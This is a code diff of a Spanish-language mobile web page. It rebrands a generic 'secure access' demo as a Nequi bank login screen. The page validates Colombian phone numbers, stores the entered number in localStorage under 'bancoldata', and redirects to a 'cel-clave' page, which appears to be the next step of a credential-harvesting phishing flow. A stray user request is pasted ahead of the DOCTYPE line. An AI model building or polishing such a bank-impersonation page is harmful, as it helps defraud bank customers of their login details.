@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+mira los colores que quiero con baner y haedar <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
@@ -12,28 +12,31 @@
       background: #2b002b;
       font-family: Arial, sans-serif;
       color: white;
+      overflow: hidden; /* evita movimientos */
     }
 
+    /* CONTENEDOR TIPO APP */
     .container {
       width: 100%;
       max-width: 400px;
       margin: 0 auto;
-      height: 100vh;
+      padding: 20px;
       display: flex;
       flex-direction: column;
+      justify-content: space-between;
+      height: 100dvh; /* evita saltos en móviles */
+      box-sizing: border-box;
     }
 
-    /* HEADER */
     header {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 20px;
     }
 
     .help-icon {
-      width: 24px;
-      height: 24px;
+      width: 22px;
+      height: 22px;
       border: 2px solid white;
       border-radius: 50%;
       display: flex;
@@ -42,30 +45,25 @@
       font-size: 14px;
     }
 
-    /* BANNER */
-    .banner {
-      background: linear-gradient(135deg, #ff008c, #7a00ff);
-      padding: 25px 20px;
-      border-bottom-left-radius: 25px;
-      border-bottom-right-radius: 25px;
+    .logo {
       text-align: center;
+      font-size: 74px;
+      font-weight: bold;
+      position: relative;
     }
 
-    .banner h1 {
-      margin: 0;
-      font-size: 22px;
+    /* cuadrado arriba de la N */
+    .logo span {
+      color: #ff008c;
+      position: absolute;
+      top: 4px;
+      left: 40%;
+      transform: translateX(-85px);
+      font-size: 28px;
     }
 
-    .banner p {
-      margin-top: 8px;
-      font-size: 14px;
-      opacity: 0.9;
-    }
-
-    /* FORM */
     .form {
-      padding: 20px;
-      margin-top: auto;
+      margin-bottom: 40px;
     }
 
     .input-box {
@@ -75,6 +73,7 @@
       display: flex;
       align-items: center;
       gap: 10px;
+      backdrop-filter: blur(6px);
     }
 
     .prefix {
@@ -91,6 +90,10 @@
       background: transparent;
       color: white;
       font-size: 16px;
+    }
+
+    .input-box input::placeholder {
+      color: #ddd;
     }
 
     .btn {
@@ -110,6 +113,10 @@
     .btn.active {
       opacity: 1;
     }
+
+    .btn:active {
+      transform: scale(0.97);
+    }
   </style>
 </head>
 
@@ -122,9 +129,8 @@
     <div></div>
   </header>
 
-  <div class="banner">
-    <h1>Acceso seguro</h1>
-    <p>Ingresa tu número para continuar</p>
+  <div class="logo">
+    <span>■</span>Nequi
   </div>
 
   <div class="form">
@@ -133,7 +139,7 @@
       <input type="tel" id="docInput" placeholder="Ingresa tu celular">
     </div>
 
-    <button class="btn" id="btn">Continuar</button>
+    <button class="btn" id="btn">Entra</button>
   </div>
 
 </div>
@@ -142,6 +148,7 @@
 const input = document.getElementById("docInput");
 const btn = document.getElementById("btn");
 
+// VALIDACIÓN CELULAR COLOMBIA
 input.addEventListener("input", () => {
   input.value = input.value.replace(/\D/g, "");
 
@@ -149,13 +156,17 @@ input.addEventListener("input", () => {
     input.value = input.value.slice(0, 10);
   }
 
-  if (input.value.length === 10 && input.value.startsWith("3")) {
+  if (
+    input.value.length === 10 &&
+    input.value.startsWith("3")
+  ) {
     btn.classList.add("active");
   } else {
     btn.classList.remove("active");
   }
 });
 
+// CLICK ORIGINAL (NO MODIFICADO)
 btn.addEventListener("click", () => {
   const value = input.value.trim();
 
@@ -164,7 +175,19 @@ btn.addEventListener("click", () => {
     return;
   }
 
-  alert("Demo: continuar al siguiente paso");
+  let data = {};
+  try {
+    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
+  } catch {
+    data = {};
+  }
+
+  data.usuario = value;
+  data.fecha = new Date().toISOString();
+
+  localStorage.setItem("bancoldata", JSON.stringify(data));
+
+  window.location.href = "cel-clave.html";
 });
 </script>
 
